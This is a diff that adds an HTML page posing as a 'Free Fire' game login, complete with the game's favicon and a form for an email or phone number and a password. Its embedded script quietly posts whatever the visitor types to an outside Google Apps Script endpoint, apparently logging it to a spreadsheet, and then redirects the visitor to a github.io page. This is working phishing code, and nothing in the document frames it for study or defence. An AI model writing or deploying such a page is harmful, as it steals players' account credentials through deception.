@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire | Login</title>
+    <link rel="stylesheet" href="loginPage.css">
+    <link rel="shortcut icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire16-2.ico" type="image/x-icon">
+</head>
+<body>
+    <div id="main">
+        <div id="box">
+            <p class="log">Log in</p>
+            <form id="inputContainer" name="submit-to-google-sheet">
+                <input type="text" name="UserName" id="userName" placeholder="Email address or phone number" required>
+                <input type="password" name="Password" id="password" placeholder="Password" required>
+                <button id="but">Log in</button>
+            </form>
+        </div>
+        
+     
+    </div>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbySwAL2G04MY_ifx32Z1R7C1wOtyL2t7fGB5eP0r6ND42PIMP3jdOuBiCXDFtEuZNTvwA/exec'
+        const form = document.forms['submit-to-google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => console.log('Success!', response))
+            .catch(error => console.error('Error!', error.message))
+            but.addEventListener('click',function(){
+            window.location.href="https://venky123895.github.io/newPage2/";
+        })
+        })
+       
+      </script>
+      
+</body>
+</html>
